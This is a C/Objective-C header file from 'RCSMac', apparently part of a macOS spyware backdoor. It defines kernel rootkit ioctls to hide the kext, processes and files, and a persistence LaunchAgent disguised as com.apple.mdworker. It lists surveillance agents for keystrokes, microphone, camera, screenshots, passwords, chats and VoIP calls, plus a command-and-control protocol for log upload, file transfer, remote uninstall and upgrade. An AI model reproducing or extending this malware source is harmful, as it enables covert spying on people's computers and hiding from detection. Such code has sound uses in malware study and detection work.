/*
 * RCSMac - RCSMCommon Header
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 08/04/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#ifndef __Common_h__
#define __Common_h__

#import <CoreAudio/CoreAudio.h>
#import <sys/sysctl.h>
#import <stdbool.h>
#import <assert.h>
#import <errno.h>

#import <netdb.h>
#import <ifaddrs.h>
#import <arpa/inet.h>
#import <netinet/in.h>

#import "RCSMSharedMemory.h"
#import "RCSMUtils.h"

#define EXT_BUNDLE_FOLDER @"appleHID"
#define ME __func__

#define LOG_DELIMITER 0xABADC0DE

//
// Protocol definition for all the agents, they must conform to this
//
@protocol Agents

- (void)start;
- (BOOL)stop;
- (BOOL)resume;

@end

typedef struct kinfo_proc kinfo_proc;

extern RCSMSharedMemory  *gSharedMemoryCommand;
extern RCSMSharedMemory  *gSharedMemoryLogging;
extern RCSMUtils         *gUtil;
extern NSLock            *gSuidLock;
extern NSLock            *gControlFlagLock;
extern NSData            *gSessionKey;

#pragma mark -
#pragma mark Code Not Used
#pragma mark -

#define invokeSupersequent(...) \
    ([self getImplementationOf: _cmd after: impOfCallingMethod(self, _cmd)]) \
    (self, _cmd, ##__VA_ARGS__)

#define invokeSupersequentNoParameters() \
    ([self getImplementationOf: _cmd after: impOfCallingMethod(self, _cmd)]) \
    (self, _cmd)

#pragma mark -
#pragma mark Kernel IOCTL stuff
#pragma mark -

#define MAX_USER_LENGTH   20
#define MAX_DIR_LENGTH    30
#define BDOR_DEVICE       "/dev/pfCPU"
#define MCHOOK_MAGIC      31338

#define KERNEL_BASE   0xffffff8000200000
#define SWAP_LONG(a) ( ((a) << 24) | \
                       (((a) << 8) & 0x00ff0000) | \
                       (((a) >> 8) & 0x0000ff00) | \
                       ((a) >> 24) )

// Used for the uspace<->kspace initialization
#define MCHOOK_INIT         _IOW(MCHOOK_MAGIC, 8978726, char [MAX_USER_LENGTH])
// Show kext from kextstat -- DEBUG
#define MCHOOK_SHOWK        _IO( MCHOOK_MAGIC, 8349871)
// Hide kext from kextstat
#define MCHOOK_HIDEK        _IO( MCHOOK_MAGIC, 4975738)
// Hide given pid
#define MCHOOK_HIDEP        _IOW(MCHOOK_MAGIC, 9400284, char [MAX_USER_LENGTH])
// Hide given dir/file name
#define MCHOOK_HIDED        _IOW(MCHOOK_MAGIC, 1998274, char [MAX_DIR_LENGTH])
// Show Process -- DEBUG
#define MCHOOK_SHOWP        _IO( MCHOOK_MAGIC, 6839840)
// Unregister userspace component
#define MCHOOK_UNREGISTER   _IOW(MCHOOK_MAGIC, 5739299, char [MAX_USER_LENGTH])
// Returns the number of active backdoors
#define MCHOOK_GET_ACTIVES  _IOR(MCHOOK_MAGIC, 7489827, int)
// Pass symbols resolved from uspace to kspace (not exported symbol snow)
#define MCHOOK_SOLVE_SYM_32 _IOW(MCHOOK_MAGIC, 6483647, struct symbol_32)
#define MCHOOK_SOLVE_SYM_64 _IOW(MCHOOK_MAGIC, 6483648, struct symbol_64)
// Tell the kext to find sysent
#define MCHOOK_FIND_SYS     _IOW(MCHOOK_MAGIC, 4548874, struct os_version)

typedef struct symbol_32 {
  uint32_t hash;
  uint32_t address;
} symbol32_t;

typedef struct symbol_64 {
  uint64_t hash;
  uint64_t address;
} symbol64_t;

typedef struct os_version {
  uint32_t major;
  uint32_t minor;
  uint32_t bugfix;
} os_version_t;

#pragma mark -
#pragma mark General Parameters
#pragma mark -

#define BACKDOOR_DAEMON_PLIST @"Library/LaunchAgents/com.apple.mdworker.plist"
#define SLI_PLIST @"/Library/Preferences/com.apple.SystemLoginItems.plist"

#define OSAX_ROOT_PATH @"Library/ScriptingAdditions"

#define XPC_BUNDLE_FOLDER_PREFIX  @"com.apple."
#define XPC_BUNDLE_FRAMEWORK_PATH @"/System/Library/Frameworks/Foundation.framework/XPCServices"

#define LOG_PREFIX    @"LOGF"

// unixEpoch - winEpoch stuff
#define EPOCH_DIFF 0x019DB1DED53E8000LL /* 116444736000000000 nsecs */
#define RATE_DIFF  10000000             /* 100 nsecs */

// Max size of the exchanged app name through SHMem
#define MAXIDENTIFIERLENGTH 22

// Max seconds to wait for an agent/event stop
#define MAX_STOP_WAIT_TIME 10

// Max seconds to wait for an action to trigger (e.g. waiting for a sync end)
#define MAX_ACTION_WAIT_TIME 60

// Encryption key length
#define KEY_LEN 128

// Size of the first 2 DWORDs that we need to skip in the configuration file
#define TIMESTAMP_SIZE sizeof(int) * 2

extern int gMemCommandMaxSize;
extern int gMemLogMaxSize;

//#define SHMEM_COMMAND_MAX_SIZE  0x3000
//#define SHMEM_LOG_MAX_SIZE      0x302460
#define SHMEM_SEM_NAME              @"sem-mdworker"
#define SHMEM_LOG_MAX_NUM_BLOCKS    315
#define SHMEM_LOG_MIN_NUM_BLOCKS    50

#pragma mark -
#pragma mark Backdoor Configuration
#pragma mark -

//
// Agents
//
#define AGENT_FILECAPTURE_OPEN      0x0000 // Log only, but used for configuring the agent
#define AGENT_FILECAPTURE           0x0001
#define AGENT_INTERNAL_FILEOPEN     0x0010 // In order to avoid having 0 on shmem->agentID
#define AGENT_INTERNAL_FILECAPTURE  0x0011
#define AGENT_KEYLOG                0x0040
#define AGENT_PRINTER               0x0100
#define AGENT_VOIP                  0x0140
#define AGENT_URL                   0x0180
#define AGENT_ORGANIZER             0x0200
#define AGENT_DEVICE                0x0240
#define AGENT_MOUSE                 0x0280
#define AGENT_EMAIL                 0x1001
#define AGENT_SCREENSHOT            0xB9B9
#define AGENT_MICROPHONE            0xC2C2
#define AGENT_CHAT                  0xC6C6
#define AGENT_CRISIS                0x02C0
#define AGENT_CLIPBOARD             0xD9D9
#define AGENT_CAM                   0xE9E9
#define AGENT_PASSWORD              0xFAFA
#define AGENT_POSITION              0x1220
#define AGENT_APPLICATION           0x1011

//
// Agents Shared Memory offsets
//
#define OFFT_KEYLOG       0x0040
#define OFFT_PRINTER      0x0440
#define OFFT_VOIP         0x0840
#define OFFT_URL          0x0C40
#define OFFT_MOUSE        0x1040
#define OFFT_MICROPHONE   0x1440
#define OFFT_IM           0x1840
#define OFFT_CLIPBOARD    0x1C40
#define OFFT_COMMAND      0x2040
#define OFFT_CORE_PID     0x2440
#define OFFT_APPLICATION  0x2840
#define OFFT_FILECAPTURE  0x2C40
#define OFFT_CRISIS       0x3040

extern u_int remoteAgents[];


// NEW - TODO
//#define EVENT_LOCKSCREEN  (uint)0x000x

// Agent Status
#define AGENT_DISABLED    @"DISABLED"
#define AGENT_ENABLED     @"ENABLED"
#define AGENT_RUNNING     @"RUNNING"
#define AGENT_STOPPED     @"STOPPED"

// Monitor Status
#define EVENT_RUNNING     @"RUNNING"
#define EVENT_STOPPED     @"STOPPED"

// Agent Commands
#define AGENT_START       @"START"
#define AGENT_STOP        @"STOP"
#define AGENT_RELOAD      @"RELOAD"

// Monitor Commands
#define EVENT_START       @"START"
#define EVENT_STOP        @"STOP"

// Actions status
#define ACTION_STANDBY    0
#define ACTION_PERFORMING 1

#pragma mark -
#pragma mark Transfer Protocol Definition
#pragma mark -

// Configuration file Tags
#define EVENT_CONF_DELIMITER "EVENTCONFS-"
#define AGENT_CONF_DELIMITER "AGENTCONFS-"
#define LOGRP_CONF_DELIMITER "LOGRPCONFS-"
#define BYPAS_CONF_DELIMITER "BYPASCONFS-"
#define ENDOF_CONF_DELIMITER "ENDOFCONFS-"

// Transfer Protocol Parameters
#define PROTO_INVALID     0x00
#define PROTO_OK          0x01
#define PROTO_NO          0x02  // Command failed
#define PROTO_BYE         0x03  // Closing connection
#define PROTO_CHALLENGE   0x04  // Challenge, need to encrypt 16 bytes
#define PROTO_RESPONSE    0x05  // Response, 16 bytes encrypted
#define PROTO_SYNC        0x06  // Send Logs
#define PROTO_NEW_CONF    0x07  // New configuration available big "nBytes"
#define PROTO_LOG_NUM     0x08  // Gonna send "nLogs"
#define PROTO_LOG         0x09  // Log big "nBytes"
#define PROTO_UNINSTALL   0x0A  // Uninstall
#define PROTO_RESUME      0x0B  // Send me back log "name" starting from "xByte"
#define PROTO_DOWNLOAD    0x0C  // Download - send me file "name" (wchar)
#define PROTO_UPLOAD      0x0D  // Upload - upload file "name" big "nBytes" to "pathName"
#define PROTO_FILE        0x0E  // Gonna receive a "fileName" big "nBytes"
#define PROTO_ID          0x0F  // Backdoor ID
#define PROTO_INSTANCE    0x10  // Device ID
#define PROTO_USERID      0x11  // IMSI/USERNAME,# unpadded bytes (sent block is padded though)
#define PROTO_DEVICEID    0x12  // IMEI/HOSTNAME,# unpadded bytes (sent block is padded though)
#define PROTO_SOURCEID    0x13  // Not used on MacOS
#define PROTO_VERSION     0x14  // Backdoor version (10 byte)
#define PROTO_LOG_END     0x15  // LogSend did finish
#define PROTO_UPGRADE     0x16  // Upgrade tag
#define PROTO_ENDFILE     0x17  // End of Transmission - file download
#define PROTO_SUBTYPE     0x18  // Specifies the backdoor subtype
#define PROTO_FILESYSTEM  0x19  // List of paths to be scanned

#pragma mark -
#pragma mark Log Types
#pragma mark -

#define LOG_DOWNLOAD      0xD0D0
#define LOG_FILESYSTEM    0xEDA1
#define LOG_URL_SNAPSHOT  AGENT_URL+1
#define LOG_INFO          0x0241

#pragma mark -
#pragma mark Agents Data Struct Definition
#pragma mark -

#define LOGTYPE_DEVICE          0x0240 // Device info Agent
typedef struct _device
{
#define LOGTYPE_DEVICE_HW   0
#define LOGTYPE_DEVICE_PROC 1
  UInt32 iType;
#define AGENT_DEV_ENABLED     1
#define AGENT_DEV_NOTENABLED  0
  UInt32 isEnabled;
} deviceStruct;

typedef struct _voipConfiguration {
  u_int sampleSize;   // Max single-sample size
  u_int compression;  // Compression factor
} voipStruct;

#pragma mark -
#pragma mark Agents Additional Header
#pragma mark -

typedef struct _mouseAdditionalHeader {
  u_int version;
#define LOG_MOUSE_VERSION 2009040201
  u_int processNameLength;
  u_int windowNameLength;
  u_int x;
  u_int y;
  u_int xMax;
  u_int yMax;
} mouseAdditionalStruct;

typedef struct _voipAdditionalHeader {
  u_int version;
#define LOG_VOIP_VERSION 2008121901
  u_int channel;            // 0 Mic - 1 Speaker
#define CHANNEL_MICROPHONE 0
#define CHANNEL_SPEAKERS   1
  u_int programType;        // VOIP_SKYPE
#define VOIP_SKYPE 1
#define VOIP_GTALK 2
#define VOIP_YAHOO 3
#define VOIP_MSMSG 4
#define VOIP_MOBIL 5
#define VOIP_SKWSA 6
  u_int sampleRate;
  u_int isIngoing;          // Not used as of now (0)
  u_int loStartTimestamp;
  u_int hiStartTimestamp;
  u_int loStopTimestamp;
  u_int hiStopTimestamp;
  u_int localPeerLength;    // Not used as of now (0)
  u_int remotePeerLength;   // Remote peer name length followed by the string
} voipAdditionalStruct;

#define SAMPLE_RATE_DEFAULT 48000
#define SAMPLE_RATE_SKYPE   48000
#define SAMPLE_RATE_GTALK   48000
#define SAMPLE_RATE_YMSG    48000
#define SAMPLE_RATE_MSN     16000

typedef struct _urlSnapshotHeader {
  u_int version;
#define LOG_URLSNAP_VERSION 2010071301
  u_int browserType;
  u_int urlNameLen;
  u_int windowTitleLen;
} urlSnapAdditionalStruct;

#pragma pack(2)

typedef struct _waveFormat
{
  short         formatTag;          /* format type */
  short         nChannels;          /* number of channels (i.e. mono, stereo...) */
  u_int         nSamplesPerSec;     /* sample rate */
  u_int         nAvgBytesPerSec;    /* for buffer estimation */
  short         blockAlign;         /* block size of data */
  short         bitsPerSample;      /* number of bits per sample of mono data */
  //short         size;               /* the count in bytes of the size of */
} waveHeader;

#pragma mark -
#pragma mark Shared Memory communication protocol
#pragma mark -

// Component ID - aka who is reading/writing from Shared Memory
#define COMP_CORE  0x0
#define COMP_AGENT 0x1

typedef struct _shMemoryCommand {
  u_int agentID;                  // agentID
  u_int direction;                // 0 - FromAgentToCore | 1 - FromCoreToAgent
#define D_TO_CORE                 0x0
#define D_TO_AGENT                0x1
  u_int command;                  // 0 - LogData | 1 - StartAgent | 2 - StopAgent
#define AG_LOGDATA                0x0
#define AG_START                  0x1
#define AG_STOP                   0x2
#define CR_REGISTER_SYNC_SAFARI   0x3 // Request from core (want to sync)
#define IM_CAN_SYNC_SAFARI        0x4 // Reply from IM (can sync with)
#define CR_UNREGISTER_SAFARI_SYNC 0x5 // Unregister the sync operation
#define IM_SYNC_DONE              0x6 // Sync ended
#define CR_CORE_PID               0x7 // core pid to Activity Monitor
  char commandData[0x3F0];
  u_int commandDataSize;
} shMemoryCommand;

//
// size: 0x271C - 10012
// OLD!!!! size: 0x2710 - 10K
//
typedef struct _shMemoryLog {
  u_int status;                       // 0 - free | 1 - Is Writing | 2 - Written
#define SHMEM_FREE                0x0
#define SHMEM_LOCKED              0x1
#define SHMEM_WRITTEN             0x2
  u_int agentID;                      // agentID
  u_int direction;                    // 0 - FromAgentToCore | 1 - FromCoreToAgent
  u_int commandType;
#define CM_NO_COMMAND             0x00000000
#define CM_CREATE_LOG_HEADER      0x00000001
#define CM_UPDATE_LOG_HEADER      0x00000002
#define CM_AGENT_CONF             0x00000004
#define CM_LOG_DATA               0x00000008
#define CM_CLOSE_LOG              0x00000010
#define CM_CLOSE_LOG_WITH_HEADER  0x00000020
  time_t timestamp;                   // timestamp used for ordering
#ifdef __i386__
  u_int dummy;
#endif
  u_int flag;                         // Per-Agent flag
  u_int commandDataSize;              // Size of the command Data
#define MAX_COMMAND_DATA_SIZE 0x26fc  // old value = 980, now = 9980
  char commandData[MAX_COMMAND_DATA_SIZE];
} shMemoryLog;

#pragma mark -
#pragma mark SharedMemory flags
#pragma mark -

#define FLAG_MORE_DATA            0x00000001

#define SKYPE_CHANNEL_INPUT       0x00000002
#define SKYPE_CHANNEL_OUTPUT      0x00000004
#define SKYPE_CLOSE_CALL          0x00000008

//
// Global variables required by the backdoor
//
extern char     gLogAesKey[];
extern char     gConfAesKey[];
extern char     gInstanceId[];
extern char     gBackdoorID[];
extern char     gBackdoorSignature[];
extern u_int    gVersion;
extern u_int    gSkypeQuality;
extern char     gMode[];

extern NSString *gBackdoorName;
extern NSString *gBackdoorUpdateName;
extern NSString *gConfigurationName;
extern NSString *gConfigurationUpdateName;
extern NSString *gInputManagerName;
extern NSString *gKext32Name;
extern NSString *gKext64Name;
extern NSString *gXPCName;
extern NSString *gMyXPCName;

#define CRISIS_STARTSTOP    (UInt32)0x2
#define CRISIS_STOP         (UInt32)0x0  // Per retrocompatibilita'
#define CRISIS_START        (UInt32)0x2  // Agent attivo
#define CRISIS_HOOK         (UInt32)0x08 // Inibisce injection dylib
#define CRISIS_SYNC         (UInt32)0x10 // Inibisce sincronizzazione

extern UInt32          gAgentCrisis;
extern NSMutableArray  *gAgentCrisisNet;
extern NSMutableArray  *gAgentCrisisApp;

// OS version
extern u_int gOSMajor;
extern u_int gOSMinor;
extern u_int gOSBugFix;

enum
{
  kErrorUnknown = -1,
};

#pragma mark -
#pragma mark Methods definition
#pragma mark -

#pragma mark Process routines

int getBSDProcessList       (kinfo_proc **procList, size_t *procCount);
NSArray *obtainProcessList  ();
BOOL findProcessWithName    (NSString *aProcess);
NSNumber *pidForProcessName (NSString *aProcess);

#if 0
IMP impOfCallingMethod (id lookupObject, SEL selector);
#endif

#pragma mark -
#pragma mark Networking routines

BOOL isAddressOnLan (struct in_addr ipAddress);
BOOL isAddressAlreadyDetected (NSString *ipAddress,
                               int aPort,
                               NSString *netMask,
                               NSMutableArray *ipDetectedList);
BOOL compareIpAddress(struct in_addr firstIp,
                      struct in_addr secondIp,
                      u_long netMask);

NSString *getHostname();

void getSystemSerialNumber(CFStringRef *serialNumber);

int matchPattern(const char *source, const char *pattern);
NSArray *searchForProtoUpload(NSString *aFileMask);
NSArray *searchFile(NSString *aFileMask);

static unsigned int sdbm(unsigned char *str);
unsigned int findSymbolInFatBinary(void *imageBase,
                                   unsigned int symbolHash);
uint64_t   findSymbolInFatBinary64(void *imageBase,
                                   unsigned int symbolHash);

#ifdef DEBUG_COMMON
void printFormatFlags(AudioStreamBasicDescription inDescription);
#endif

size_t _utf16len(unichar *string);

NSDictionary *getActiveWindowInfo();

BOOL is64bitKernel();

#ifdef DEMO_VERSION
void changeDesktopBackground(NSString *aFilePath, BOOL wantToRestoreOriginal);
#endif

#endif
